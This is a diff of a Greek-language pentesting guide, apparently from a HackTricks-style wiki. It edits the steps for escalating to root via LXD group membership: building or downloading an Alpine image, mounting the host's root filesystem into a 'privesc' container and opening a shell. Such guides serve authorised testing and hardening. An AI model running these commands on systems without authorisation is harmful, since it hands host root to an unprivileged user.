@@ -8,18 +8,23 @@
 
 ### Μέθοδος 1
 
-Μπορείτε να εγκαταστήσετε σε μηχανή σας αυτόν τον κατασκευαστή διανομών: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(ακολουθήστε τις οδηγίες του github):
+Μπορείτε να κατεβάσετε μια εικόνα alpine για χρήση με lxd από ένα αξιόπιστο αποθετήριο. 
+Η Canonical δημοσιεύει καθημερινές εκδόσεις στην ιστοσελίδα τους: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/) 
+Απλά πάρτε και τα δύο **lxd.tar.xz** και **rootfs.squashfs** από την πιο πρόσφατη έκδοση. (Το όνομα του καταλόγου είναι η ημερομηνία).
+
+Εναλλακτικά, μπορείτε να εγκαταστήσετε στον υπολογιστή σας αυτόν τον κατασκευαστή διανομών: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (ακολουθήστε τις οδηγίες του github):
 ```bash
-sudo su
 # Install requirements
 sudo apt update
-sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
+sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage
 
 # Clone repo
+mkdir -p $HOME/go/src/github.com/lxc/
+cd $HOME/go/src/github.com/lxc/
 git clone https://github.com/lxc/distrobuilder
 
 # Make distrobuilder
-cd distrobuilder
+cd ./distrobuilder
 make
 
 # Prepare the creation of alpine
@@ -27,13 +32,10 @@ mkdir -p $HOME/ContainerImages/alpine/
 cd $HOME/ContainerImages/alpine/
 wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 
-# Create the container
-## Using build-lxd
-sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
-## Using build-lxc
-sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
+# Create the container - Beware of architecture while compiling locally.
+sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-Ανεβάστε τα αρχεία **lxd.tar.xz** και **rootfs.squashfs**, προσθέστε την εικόνα στο αποθετήριο και δημιουργήστε ένα κοντέινερ:
+Ανεβάστε τα αρχεία **incus.tar.xz** (**lxd.tar.xz** αν τα κατεβάσατε από το αποθετήριο Canonical) και **rootfs.squashfs**, προσθέστε την εικόνα στο αποθετήριο και δημιουργήστε ένα κοντέινερ:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -49,8 +51,8 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> Αν βρείτε αυτό το σφάλμα _**Σφάλμα: Δεν βρέθηκε πισίνα αποθήκευσης. Παρακαλώ δημιουργήστε μια νέα πισίνα αποθήκευσης**_\
-> Εκτελέστε **`lxd init`** και **επαναλάβετε** το προηγούμενο κομμάτι εντολών
+> Αν βρείτε αυτό το σφάλμα _**Error: No storage pool found. Please create a new storage pool**_\
+> Εκτελέστε **`lxd init`** και ρυθμίστε όλες τις επιλογές στις προεπιλεγμένες ρυθμίσεις. Στη συνέχεια **επαναλάβετε** το προηγούμενο κομμάτι εντολών
 
 Τέλος, μπορείτε να εκτελέσετε το κοντέινερ και να αποκτήσετε root:
 ```bash
@@ -60,7 +62,7 @@ lxc exec privesc /bin/sh
 ```
 ### Μέθοδος 2
 
-Δημιουργήστε μια εικόνα Alpine και ξεκινήστε την χρησιμοποιώντας την επιλογή `security.privileged=true`, αναγκάζοντας το κοντέινερ να αλληλεπιδρά ως root με το σύστημα αρχείων του host.
+Δημιουργήστε μια εικόνα Alpine και ξεκινήστε την χρησιμοποιώντας την επιλογή `security.privileged=true`, αναγκάζοντας το κοντέινερ να αλληλεπιδρά ως root με το σύστημα αρχείων του κεντρικού υπολογιστή.
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
